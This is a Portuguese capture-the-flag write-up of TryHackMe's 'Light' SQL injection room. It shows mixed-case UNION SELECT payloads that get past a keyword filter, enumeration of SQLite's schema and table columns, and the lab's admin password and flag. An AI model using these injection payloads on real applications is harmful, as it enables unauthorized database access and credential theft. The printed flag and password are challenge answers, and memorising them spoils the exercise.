# Room - Light - TryHackMe 
Autor: carlossb1\
Level: Easy\
Tópico: SQL Injection

# Introdução
![image](https://github.com/user-attachments/assets/f22b9991-a50b-4283-9875-63043ec6dc2f)


Ao conectar no servidor, somos recebidos com um campo para inserir um username. Usando o username que o desafio fornece no enunciado, o servidor nos retorna senha desse usuário.

![image](https://github.com/user-attachments/assets/e3b8289d-fc2e-4437-8fd7-90fbf1a81bd2)


A primeira ideia foi tentar conectar via SSH com essas credenciais, mas não foi possível.

![image](https://github.com/user-attachments/assets/227af177-d11b-4a4d-9c71-8390642ef480)

Como o enunciado sugere que é um sistema de banco de dados, a segunda aproximação envolveu verificar se o sistema é vulnerável a ataques de SQL Injection.

Utilizando alguns dos payloads encontrados no [repositório do payloadbox](https://github.com/payloadbox/sql-injection-payload-list), e baseado nas mensagens de erro, foi possível identificar que o engine usado no banco de dados era o SQLite

Testando o payload `' UNION SELECT 1+1'` foi exibida uma mensagem indicando que existem filtros para algumas expressões e caracteres.

Felizmente as expressões do SQLite não são case-sensitive, então ao tentar alternar os caracteres entre maiúsculos e minúsculos, conseguimos bypassar o filtro e executar as operações normalmente.

`' UnIoN SeLeCt 1+1 '`

retornou o resultado: 2, indicando que o código estava sendo de fato executado pelo banco de dados.

![image](https://github.com/user-attachments/assets/67bc00e4-32bb-415c-8ba9-029551c7bca5)

A partir daí, o foco é em enumerar as informações das tabelas. Para isso, vamos prosseguir com o método de ataque utilizando as expressões `UNION` [SQL INJECTION UNION ATTACKS - PORTSWIGGER](https://portswigger.net/web-security/sql-injection/union-attacks)

Conforme a [documentação](https://www.sqlite.org/schematab.html) do SQLite, em todos os bancos de dados que utilizam essa engine, vai existir uma tabela que contém algumas 
informações sobre todas as outras tabelas.

CREATE TABLE sqlite_schema(
  type text,
  name text,
  tbl_name text,
  rootpage integer,
  sql text
);`

Podendo receber esses nomes alternativos: 
    sqlite_master
    sqlite_temp_schema
    sqlite_temp_master 


Seguindo nosso procedimento para conseguir as informações, podemos utilizar o payload
`' UNiON SeLect name FROM sqlite_master '`

![image](https://github.com/user-attachments/assets/9c8fe118-20d6-4ed5-8098-9e788bfa805e)

Descobrimos a tabela admintable

Agora podemos fazer o mesmo processo dentro dessa tabela.
Para descobrir o nome das colunas, podemos realizar a consulta à estrutura pragma_table, conforme exemplificado nesse [post do fórum do SQLite](https://sqlite.org/forum/info/9add3c3898aed7c4)

`' UnIoN SeLect name from pragma_table_info('admintable') '`
Primeira coluna: id

`' UnIoN SeLect name from pragma_table_info('admintable') where name != 'id`
Segunda coluna: password

`' UnIon SeLect name from pragma_table_info('admintable') where name != 'id' and name != 'password`
Terceira coluna: username

![image](https://github.com/user-attachments/assets/9fa1dbb6-63de-4cde-b674-569dbb22317e)

# Verificando os usernames
`' UnIon SeLect username from admintable ' `
user : *TryHackMeAdmin*

`' UnIoN SeLeCt password from admintable where username = 'TryHackMeAdmin`
senha : *mamZtAuMlrsEy5bp6q17*

![image](https://github.com/user-attachments/assets/5a91292a-f4e1-4713-94af-d967347c56c2)

Vamos tentar realizar o acesso via SSH com essas credenciais, mas novamente, não foi possível.

![image](https://github.com/user-attachments/assets/285923c5-f07a-46aa-bc91-a6c8b9176c98)

Realizando uma nova consulta ao banco de usuários <br>
`' UnIon SeLect username from admintable where username != 'TryHackMeAdmin`

Olha ela aí!, encontramos o usuário *flag* agora vamos ver se a flag está na senha <br>
`' UnIoN SeLeCt password from admintable where username = 'flag`

![image](https://github.com/user-attachments/assets/cabcb408-fc4e-4a13-9cfa-4622a0c4a644)

E Foi!
Encontramos a flag
THM{SQLit3_InJ3cTion_is_SimplE_nO?}

